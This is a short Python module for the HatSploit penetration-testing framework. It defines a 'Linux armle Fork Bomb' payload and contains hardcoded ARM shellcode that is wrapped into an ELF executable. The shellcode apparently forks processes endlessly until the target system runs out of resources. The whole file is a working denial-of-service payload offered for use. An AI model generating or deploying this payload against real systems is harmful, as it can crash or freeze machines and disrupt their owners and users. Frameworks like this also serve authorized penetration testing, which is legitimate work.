#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatvenom import HatVenom
from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload, HatVenom):
    details = {
        'Category': "stager",
        'Name': "Linux armle Fork Bomb",
        'Payload': "linux/armle/fork_bomb",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Fork bomb payload for Linux armle.",
        'Comments': [
            ''
        ],
        'Architecture': "armle",
        'Platform': "linux",
        'Risk': "low",
        'Type': "one_side"
    }

    def run(self):
        self.output_process("Generating shellcode...")
        shellcode = (
            b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x7f\x40"
            b"\x02\x27\x01\xdf\xc0\x46\xff\xf7\xfa\xff"
        )

        self.output_process("Generating payload...")
        payload = self.generate('elf', 'armle', shellcode)

        return payload
